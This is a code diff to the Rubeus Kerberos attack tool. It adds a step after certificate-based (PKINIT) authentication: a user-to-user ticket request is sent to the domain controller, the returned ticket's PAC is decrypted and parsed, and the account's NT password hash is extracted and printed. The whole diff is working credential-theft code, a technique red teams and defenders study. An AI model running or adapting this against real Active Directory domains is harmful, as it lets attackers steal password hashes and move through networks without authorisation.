@@ -435,11 +435,13 @@ namespace Rubeus {
 
             // convert the key string to bytes
             byte[] key;
+            bool isPKINIT = false;
             if (GetPKInitRequest(asReq, out PA_PK_AS_REQ pkAsReq)) {      
                 // generate the decryption key using Diffie Hellman shared secret 
                 PA_PK_AS_REP pkAsRep = (PA_PK_AS_REP)rep.padata[0].value;                    
                 key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), new byte[0], 
                     pkAsRep.DHRepInfo.ServerDHNonce, GetKeySize(etype));
+                isPKINIT = true;
             } else {
                 // convert the key string to bytes
                 key = Helpers.StringToByteArray(asReq.keyString);
@@ -568,6 +570,100 @@ namespace Rubeus {
             {
                 KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                 LSA.DisplayTicket(kirbi);
+            }
+
+            if (isPKINIT)
+            {
+                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+                string dcIP = Networking.GetDCIP(info.prealm, false);
+                if (String.IsNullOrEmpty(dcIP)) { return null; }
+
+                byte[] tgsBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], kirbi.tickets[0], encRepPart.key.keyvalue, (Interop.KERB_ETYPE)encRepPart.key.keytype, (Interop.KERB_ETYPE)encRepPart.key.keytype, Interop.KdcOptions.ENCTKTINSKEY, rep.ticket);
+
+                byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
+                if (response == null)
+                {
+                    return null;
+                }
+
+                // decode the supplied bytes to an AsnElt object
+                //  false == ignore trailing garbage
+                AsnElt responseAsn2 = AsnElt.Decode(response, false);
+
+                // check the response value
+                int responseTag = responseAsn2.TagValue;
+
+                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
+                {
+                    // parse the response to an TGS-REP
+                    TGS_REP rep2 = new TGS_REP(responseAsn2);
+
+                    // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
+                    byte[] outBytes2 = Crypto.KerberosDecrypt((Interop.KERB_ETYPE)encRepPart.key.keytype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, encRepPart.key.keyvalue, rep2.enc_part.cipher);
+                    AsnElt ae2 = AsnElt.Decode(outBytes2, false);
+                    EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);
+
+                    var rawBytes = Crypto.KerberosDecrypt((Interop.KERB_ETYPE)encRepPart.key.keytype, 2, encRepPart.key.keyvalue, rep2.ticket.enc_part.cipher);
+                    
+                    AsnElt ae3 = AsnElt.Decode(rawBytes, false);
+
+                    foreach (AsnElt s in ae3.Sub[0].Sub)
+                    {
+                        if (s.TagValue != 10)
+                        {
+                            continue;
+                        }
+
+                        AsnElt ad;
+                        for (ad = s; ad.Sub != null && ad.Sub.Length > 0; ad = ad.Sub[ad.Sub.Length - 1]) ;
+                        for (ad = AsnElt.Decode(ad.GetOctetString(), false); ad.Sub != null && ad.Sub.Length > 0; ad = ad.Sub[ad.Sub.Length - 1]) ;
+                        byte[] pac = ad.GetOctetString();
+
+                        Stream stream = new MemoryStream(pac);
+                        BinaryReader reader = new BinaryReader(stream);
+
+                        uint length = reader.ReadUInt32();
+                        uint version = reader.ReadUInt32();
+                        for (int i = 0; i < length; i++)
+                        {
+                            uint ulType = reader.ReadUInt32();
+                            uint cbBufferSize = reader.ReadUInt32();
+                            ulong offset = reader.ReadUInt64();
+
+                            if (ulType != 0x00000002) // PAC_CREDENTIAL_INFO
+                            {
+                                continue;
+                            }
+                            byte[] credentialInfo = new byte[cbBufferSize];
+                            Array.Copy(pac, (int)offset, credentialInfo, 0, cbBufferSize);
+
+                            version = reader.ReadUInt32();
+                            uint encryptionType = reader.ReadUInt32();
+                            byte[] serializedData = new byte[cbBufferSize - 8];
+                            Array.Copy(credentialInfo, 8, serializedData, 0, cbBufferSize - 8);
+
+                            byte[] decrypted = Crypto.KerberosDecrypt((Interop.KERB_ETYPE)encRepPart.key.keytype, 16, key, serializedData);
+
+                            int j;
+                            for (j = decrypted.Length - 1; decrypted[j] == 0; j--);
+                            string NTLM = "";
+                            while(decrypted[j] != 0)
+                            {
+                                NTLM = decrypted[j].ToString("X2") + NTLM;
+                                j--;
+                            }
+
+                            if (NTLM.Length == 32)
+                            {
+                                Console.WriteLine("[+] NT Hash: {0}", NTLM.ToLower());
+                            }
+
+                            break;
+                        }
+
+                        break;
+                    }
+                }
             }
 
             return kirbiBytes;
